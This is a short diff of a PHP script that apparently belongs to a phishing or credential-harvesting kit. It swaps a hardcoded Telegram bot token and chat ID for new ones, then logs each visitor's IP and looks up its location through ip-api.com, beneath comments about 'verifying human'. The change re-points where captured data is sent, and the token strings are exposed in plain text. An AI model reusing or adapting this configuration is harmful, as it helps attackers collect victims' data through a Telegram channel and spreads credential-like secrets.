@@ -1056,8 +1056,9 @@ function telegram($msg) {
 }
 //verifying human\\
 //required control\\
-$telegrambot = '5055359847:AAG1qTAiykWANsRb1HZL0JIdQ0_nBtzkf0o';
-$telegramchatid = 1528668410;
+$telegrambot = '5925360317:AAF-2uqBy_PSBEH3OzKGMWZcY8oPyJXx-NM
+';
+$telegramchatid = 5404345823;
 
 $ip=$_SERVER['REMOTE_ADDR']; 
 $ipapi = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
